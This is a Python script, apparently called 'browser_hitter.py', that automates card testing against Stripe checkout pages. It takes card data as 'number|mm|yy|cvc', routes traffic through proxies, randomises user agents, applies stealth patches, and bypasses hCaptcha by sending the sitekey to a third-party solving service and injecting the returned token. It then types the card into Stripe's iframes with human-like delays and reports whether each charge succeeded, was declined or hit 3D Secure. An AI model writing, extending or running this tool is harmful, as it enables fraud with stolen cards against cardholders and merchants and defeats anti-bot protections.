import asyncio
import random
import sys
import os
import httpx
from playwright.async_api import async_playwright
from playwright_stealth import stealth
from dotenv import load_dotenv

load_dotenv()
AZAPI_KEY = os.getenv("AZAPI_KEY")

# User Agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
]

async def hit_card(url, card_str, proxy=None):
    if '|' not in card_str:
        print(f"ERROR: Invalid card format {card_str}")
        return

    card, mm, yy, cvc = card_str.split('|')
    
    async with async_playwright() as p:
        # Launch browser (Headless=False to see it work, can be changed to True)
        browser = await p.chromium.launch(headless=False)
        
        # Random User Agent for this session
        ua = random.choice(USER_AGENTS)
        
        context_args = {"user_agent": ua}
        if proxy:
            # Handle socks5://user:pass@host:port or http://user:pass@host:port
            print(f"🌐 Using Proxy: {proxy}")
            context_args["proxy"] = {"server": proxy}
            
        context = await browser.new_context(**context_args)
        
        page = await context.new_page()
        await stealth(page)
        
        print(f"🚀 Navigating to: {url}")
        try:
            await page.goto(url, wait_until="networkidle", timeout=60000)
            
            # --- hCaptcha Check ---
            print("🔍 Checking for hCaptcha...")
            hcaptcha_iframe = await page.query_selector('iframe[src*="hcaptcha.com"]')
            if hcaptcha_iframe:
                print("🧩 hCaptcha detected! Attempting to solve with Azapi...")
                # Extract sitekey
                src = await hcaptcha_iframe.get_attribute("src")
                sitekey = None
                if "sitekey=" in src:
                    sitekey = src.split("sitekey=")[1].split("&")[0]
                
                if sitekey and AZAPI_KEY:
                    print(f"🔑 Sitekey: {sitekey}")
                    async with httpx.AsyncClient() as client:
                        resp = await client.post(
                            "https://api.azapi.ai/h0001c",
                            headers={"Authorization": AZAPI_KEY},
                            json={"sitekey": sitekey, "pageurl": url},
                            timeout=60.0
                        )
                        result = resp.json()
                        if result.get("success") and result.get("data", {}).get("solution"):
                            token = result["data"]["solution"]
                            print("✅ hCaptcha Solved! Injecting token...")
                            await page.evaluate(f"""
                                document.getElementsByName('h-captcha-response').forEach(el => el.innerHTML = '{token}');
                                document.getElementsByName('g-recaptcha-response').forEach(el => el.innerHTML = '{token}');
                                if (window.hcaptcha) {{
                                    window.hcaptcha.execute(); 
                                }}
                            """)
                            await asyncio.sleep(2)
                        else:
                            print(f"❌ Azapi Failed: {result.get('message', 'Unknown error')}")
                else:
                    print("⚠️ Could not find sitekey or AZAPI_KEY missing.")

            # Find Stripe Iframes
            print("⏳ Waiting for Stripe fields...")
            await page.wait_for_selector('iframe[name^="__privateStripeFrame"]', timeout=30000)
            
            # Fill Card Number
            card_frame = page.frame(name=lambda n: "__privateStripeFrame" in n and "1" in n) # Usually 1 or specific
            # Using selector search is safer
            frames = page.frames
            card_input_frame = None
            for f in frames:
                if "stripe" in f.url and "elements" in f.url:
                    card_input_frame = f
                    break
            
            if not card_input_frame:
                print("❌ Could not locate Stripe iframe.")
                await browser.close()
                return

            # Human-like typing
            async def human_type(frame, selector, text):
                await frame.click(selector)
                for char in text:
                    await frame.type(selector, char, delay=random.randint(50, 200))

            print("⌨️ Inputting card details...")
            # Note: Stripe usually uses 'input[name="cardnumber"]' inside the iframe
            # But the 'cardNumber' selector is more common in their SDK
            await human_type(card_input_frame, 'input[name="cardnumber"]', card)
            await human_type(card_input_frame, 'input[name="exp-date"]', f"{mm}{yy}")
            await human_type(card_input_frame, 'input[name="cvc"]', cvc)
            
            # Maybe Name/Zip if requested? (Optional for now)
            
            print("🔘 Clicking Pay...")
            # Try to find the submit button on the MAIN page
            submit_selectors = ['button[type="submit"]', '.SubmitButton', '#submit-button', 'button:has-text("Pay")']
            for s in submit_selectors:
                if await page.is_visible(s):
                    await page.click(s)
                    break
            
            # Wait for result
            print("⌛ Waiting for result (60s max)...")
            await asyncio.sleep(10) # Initial wait
            
            # Check for 3DS or Success/Failure
            content = await page.content()
            if "Successful" in content or "Thank you" in content:
                 print(f"SUCCESS: Payment successful for {card_str}")
            elif "declined" in content.lower() or "failed" in content.lower():
                 print(f"FAILURE: Card declined ({card_str})")
            elif "authenticate" in content.lower() or "security" in content.lower():
                 print(f"3DS: 3D Secure Verification Required")
            else:
                 print(f"UNKNOWN: Result not detected, please check manual window.")
                 await asyncio.sleep(15) # Give user time to see
            
        except Exception as e:
            print(f"ERROR: {str(e)}")
        finally:
            await browser.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python browser_hitter.py <url> <card> [proxy]")
    else:
        target_url = sys.argv[1]
        card_data = sys.argv[2]
        proxy_url = sys.argv[3] if len(sys.argv) > 3 else None
        asyncio.run(hit_card(target_url, card_data, proxy_url))
